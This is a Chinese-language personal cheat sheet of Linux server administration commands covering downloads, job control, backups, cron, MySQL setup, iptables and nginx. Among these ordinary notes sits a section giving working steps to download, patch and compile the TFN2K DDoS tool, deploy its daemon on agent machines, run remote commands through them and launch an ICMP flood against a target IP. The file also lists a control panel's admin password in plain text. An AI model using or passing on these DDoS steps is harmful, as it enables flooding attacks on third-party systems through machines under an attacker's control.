# Linux 常用指令

【文件下载】
wget http://www.domain.com/xxx.zip
-- 下载需要登陆的文件
1、cookies.txt文件的制作：用Chrome的插件Export Cookies导出wget用的cookie。导出来的文件是cookies.txt
https://chrome.google.com/webstore/detail/cookietxt-export/lopabhfecdfhgogdbojmaicoicjekelh
2、wget -c –load-cookies=cookies.txt "下载地址" -O "文件名"
【不挂断运行】
nohup cammond &

【实时查看文件内容】
tail -f catalina.out    或    tailf catalina.out

【查看后台运行进程】
jobs –l
fg %n 让后台运行的进程n到前台来
fg、bg、jobs、&、ctrl + z都是跟系统任务有关的，虽然现在基本上不怎么需要用到这些命令，但学会了也是很实用的
一。& 最经常被用到
   这个用在一个命令的最后，可以把这个命令放到后台执行
二。ctrl + z
     可以将一个正在前台执行的命令放到后台，并且暂停
三。jobs
     查看当前有多少在后台运行的命令
四。fg
     将后台中的命令调至前台继续运行
   如果后台中有多个命令，可以用 fg %jobnumber将选中的命令调出，%jobnumber是通过jobs命令查到的后台正在执行的命令的序号(不是pid)
五。bg
     将一个在后台暂停的命令，变成继续执行
   如果后台中有多个命令，可以用bg %jobnumber将选中的命令调出，%jobnumber是通过jobs命令查到的后台正在执行的命令的序号(不是pid)
【SSH终端连接超时】
1、echo $TMOUT，如果大于0，在/etc/profile中设置为0
2、vi /etc/ssh/sshd_config
        将 ClientAliveInterval 0和ClientAliveCountMax 3的注释符号去掉,将ClientAliveInterval对应的0改成60,ClientAliveInterval指定了服务器端向客户端请求消息 的时间间隔, 默认是0秒, 不发送
service sshd restart
【tar备份指令】
>tar -zcvf /usr/tomcat7/bak/2013-12-18.11.30.tar.gz ./ROOT
tar -zcvf /usr/tomcat7/bak/2013-12-27.10-32.tar.gz /usr/tomcat7/webapps/ROOT
 
【linux下的tomcat乱码解决方法】
vim catalina.sh  
设置：LANG='zh_CN.UTF-8'，原来可能是GBK
原来的可能是GBxxxx ，如果没有则添加这一行，重启tomcat即可生效
【安静模式复制文件】
 \cp -rvf ./test/* ./ROOT/^C    前面的\表示不使用别名，cp默认别名是cp -i(一个一个确认)
【输出时间】
$(date +%Y-%m-%d.%T)

【定时任务、自动备份】
crontab -e 添加定时任务
分 小时 日 月 星期 命令
0-59 0-23 1-31 1-12 0-6 command (取值范围,0表示周日一般一行对应一个任务)
00 08 * * * /root/mysql_backup.sh    表示每天早上08:00 执行/root目录下的mysql_backup.sh

【批量修改文件所有者】
user:nginx 表示将文件所有者修改为user，分组修改为nginx，最后的参数为目录，-R为递归包含子目录
chown -R user:nginx /var/www/user

【安装jdk、java运行环境】
需要先到oracle官方下载对应的jdk版本，下载jdk-xxx-linux-xxx.rpm的安装包，64位系统下载x64，32位系统下载x86
http://www.oracle.com/technetwork/java/javase/downloads/jdk7-downloads-1880260.html
下载之后上传到自己的linux服务器上面，然后执行下面的指令即可
rpm -ivh jdk-7u15-linux-x64.rpm

【安装mysql】
http://www.2cto.com/database/201207/141878.html
linux下使用yum安装mysql
1、安装
查看有没有安装过：
          yum list installed mysql*
          rpm -qa | grep mysql*
查看有没有安装包：
          yum list mysql*
安装mysql客户端：
          yum install mysql
安装mysql 服务器端：
          yum install mysql-server
          yum install mysql-devel
  www.2cto.com  
2、启动&&停止
数据库字符集设置
          mysql配置文件/etc/my.cnf中加入default-character-set=utf8
启动mysql服务：
          service mysqld start或者/etc/init.d/mysqld start
开机启动：
          chkconfig -add mysqld，查看开机启动设置是否成功chkconfig --list | grep mysql*
          mysqld             0:关闭    1:关闭    2:启用    3:启用    4:启用    5:启用    6:关闭
停止：
          service mysqld stop
2、登录
创建root管理员：
          mysqladmin -u root password 123456
  www.2cto.com  
登录：
          mysql -u root -p输入密码即可。
忘记密码：
          service mysqld stop
          mysqld_safe --user=root --skip-grant-tables
          mysql -u root
          use mysql
          update user set password=password("new_pass") where user="root";
          flush privileges;  
3、远程访问
开放防火墙的端口号
mysql增加权限：mysql库中的user表新增一条记录host为“%”，user为“root”。
4、Linux MySQL的几个重要目录
  www.2cto.com  
数据库目录
         /var/lib/mysql/
配置文件
         /usr/share /mysql（mysql.server命令及配置文件）
相关命令
         /usr/bin（mysqladmin mysqldump等命令）
启动脚本
         /etc/rc.d/init.d/（启动脚本文件mysql的目录）
【解决乱码】
http://www.cnblogs.com/R-zqiang/archive/2012/11/23/2785125.html
Linux系统修改编码
Windows的默认编码为GBK，Linux的默认编码为UTF-8。在Windows下编辑的中文，在Linux下显示为乱码。为了解决此问题，修改Linux的默认编码为GBK。方法如下：
方法1：
vi   /etc/sysconfig/i18n
默认为:
LANG="en_US.UTF-8"
SYSFONT="latarcyrheb-sun16"
修改为:
LANG="zh_CN.GBK"
SUPPORTED="zh_CN.UTF-8:zh_CN:zh"
SYSFONT="latarcyrheb-sun16"
方法2：
vi /etc/profile
export LC_ALL="zh_CN.GBK"
export LANG="zh_CN.GBK"
【Linux上传文件】
scp、
http://www.ibm.com/developerworks/cn/linux/l-cn-filetransfer/

【删除指定日期前的文件】
find -mtime +45 | xargs rm -rvf

【查看文件夹大小】
du -sh region
【防火墙配置】
iptables -I INPUT -p tcp -–dport 80 -j ACCEPT允许80端口进入
iptables -I OUTPUT -p tcp -–dport 3306 -j ACCEPT允许3306端口出去
service iptables status查看防火墙状态
service iptables save 保存配置
service iptables restart重启防火墙
【RPM卸载程序】
rpm -qa    查看安装包列表
rpm -e jre-<version>-fcs    卸载程序

【linux推送文件，文件互传】
scp -P 25560 /alidata1/jdk-7u71-linux-x64.rpm root@n.s5.timetown.net:/tmp    下载
       端口  本地文件目录                       远程账号@地址:目录（目录一般为/tmp）
scp -r s4-25565_20150106.zip root@10.160.46.55:/a  上传

【zadmin】
 ========== Zhujibao install is finished ====
            Manager URL: http://ip:9999
            Username:admin Password: c6265c40
 ========== Power By z.admin5.com ===========
【定时任务】
crontab -e    编辑定时任务
crontab -l    查看定时任务
00 2 * * * root /a/apps/script/statis.sh    定时任务命令行
分 时 天 月 星 用户 脚本
service crond start    启动服务，默认未启动，并且需要加入开机启动项：/etc/rc.d/rc.local
【修改用户】
vi /etc/passwd
【查看运行的Java】
ps -ef | grep java
【批量文件比较】
diff -rq /tmp/classes /usr/local/tomcat/qianweb.chinap2g.com/webapps/ROOT/WEB-INF/classes

【vsftp强制家目录】
chroot_local_user=YES

【TCP端口转发】
10.162.95.193是本地IP，是要转发到的IP，218.244.150.85是本地公网IP
2222是本地端口，25565是远程端口，第一个25565是本地端口，第二个25565是远程端口
清除
iptables -F -t nat
设置转发
iptables -t nat -I PREROUTING -d 218.244.150.85 -p tcp -m tcp --dport 25565 -j DNAT --to-destination 10.160.46.55:25565
设置转发回送
iptables -t nat -A POSTROUTING -d 10.160.46.55 -p tcp -m tcp --dport 25565 -j SNAT --to-source 10.162.95.193
保存配置
service iptables save
重启服务
service iptables restart

【批量查找】
grep -r "关键字" ./

【查看内存条信息】
dmidecode |grep -A16 "Memory Device"

【清除mem缓存】
首先我们需要使用sync指令，将所有未写的系统缓冲区写到磁盘中，包含已修改的 i-node、已延迟的块 I/O 和读写映射文件。否则在释放缓存的过程中，可能会丢失未保存的文件。
#sync
接下来，我们需要将需要的参数写进/proc/sys/vm/drop_caches文件中，比如我们需要释放所有缓存，就输入下面的命令：
#echo 3 > /proc/sys/vm/drop_caches
http://blog.sina.com.cn/s/blog_539d6e0c0100ys3o.html

【封禁/解封IP】
iptables -I INPUT -s 123.44.55.66 -j DROP    封禁
iptables -D INPUT -s 123.44.55.66 -j DROP    解封

【DDOS-tfn2k】
wget http://www.xfocus.net/tools/200405/tfn2k.tgz
tar zxvf tfn2k.tgz
vim aes.h    //将typedef unsigned long u4byte;改成typedef unsigned int  u4byte; 在64位的系统下，GCC会认为unsigned long是8个字节，而tfn2k把它当4个字节使用，从而导致在aes_setkey函数中误用。 最终导致的问题就是，在使用tfn时，一直提示“Sorry, passwords do not match.”
vim ip.h    //修改123行，并注解掉以下 
#ifndef in_addr
/*struct in_addr
  {
    unsigned long int s_addr;
  }*/;
vim mkpass.c    //修改87行，并加入0777 
原始:fd = open ("pass.c", O_WRONLY | O_TRUNC | O_CREAT);
修改后:fd = open ("pass.c", O_WRONLY | O_TRUNC | O_CREAT, 0777);
vim disc.c     //修改30行，并加入0777 
原始:close (open ("agreed", O_WRONLY | O_CREAT | O_TRUNC));
修改后:close (open ("agreed", O_WRONLY | O_CREAT | O_TRUNC, 0777));
#make
按完yes后，会需要输入8-16码的密码，即可完成。
编译通过后，会产生td及tfn，这就是大名鼎鼎的tfn2k啦~,td是守护进程，用来安装在代理中的，而tfn就是控制端. 将td放在代理机器中，tfn放在控制机器中
建立host.txt代理机器IP地址集，./tfn -f host.txt -c 10 -i "mkdir wjpfjy"  与host.txt中的代理通讯，让其执行命令mkdir wjpfjy即建立一个目录
./tfn -f host.txt -c 6 -i 192.168.0.5开始ICMP/PING 攻击
./tfn -f host.txt -c 0 停止攻击
相关链接：http://www.chinaunix.net/old_jh/4/266835.html、http://blog.chinaunix.net/uid-16728139-id-4411623.html、http://www.xfocus.net/tools/200405/697.html、http://phorum.study-area.org/index.php/topic,67375.msg331808.html

【if判断】
以下代码是判断变量是否为空串
if [ -z "$new_version" ]; then
        echo "没有找到更新包，请将更新包(*.zip)放入本级目录" && exit 0
fi
参考文档：http://blog.sina.com.cn/s/blog_63597c690100qt47.html

【安装OpenSSL】
参考文档：http://china.ygw.blog.163.com/blog/static/6871974620121118102817580/、http://zengwu3915.blog.163.com/blog/static/2783489720145171114077/

【nginx页面静态化】
location  ~ \.html? {
    proxy_store        /tmp/www$uri; 
    # 如果页面是GZIP乱码，则需要加上这个头部信息
    if ( -e $request_filename ) {
        add_header      "Content-Encoding"      "gzip";    
    }
    proxy_store_access user:rw group:rw all:r; 
    root               /tmp/www; 
    if ( !-e $request_filename) { 
        proxy_pass         http://127.0.0.1:9080;
    }
}

![](https://i.loli.net/2018/05/11/5af557ca38f37.png)
